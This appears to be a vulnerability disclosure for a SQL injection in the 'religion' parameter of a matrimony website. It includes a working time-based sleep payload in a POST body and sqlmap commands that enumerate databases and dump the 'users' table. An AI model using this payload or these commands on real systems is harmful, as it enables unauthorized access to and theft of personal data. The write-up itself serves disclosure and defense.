...
The vulnerability exists because user-controlled input from the religion parameter is  concatenated directly into an SQL query without server-side sanitization or parameterized  statements. 
...
Because no parameterized query or escaping mechanism is used, arbitrary SQL statements can be injected via the religion parameter. The mysqlexec() function executes the query directly via mysqli_query() with no sanitization applied at any layer, allowing the injected payload to reach the database unfiltered.
...
The intercepted POST request was modified by injecting a time-based SQL payload into the  religion parameter. 

Payload: 
sex=male&maritalstatus=Single&country=Dubai&district=Calicut&state=Kerala&religion=Christian-All'%2b(select*from(select(sleep(20)))a)%2b'&mothertounge=Tamil&agemin=19&agemax=50&search=Search
...
command: ```python python .\sqlmap.py -r .\code_test_1.txt -p religion --dbs```

![POC](images/sqli%201.png)
![POC](images/sqli%202.png)


SQLMap confirmed that the religion parameter is injectable using: 
• Boolean-based Blind SQL Injection  
• Error-based SQL Injection  
• Time-based Blind SQL Injection 


 ```python python .\sqlmap.py -r .\code_test_1.txt -p religion -D matrimony --tables```
...
command: ```python python .\sqlmap.py -r .\code_test_1.txt -p religion -D matrimony -T users --dump```
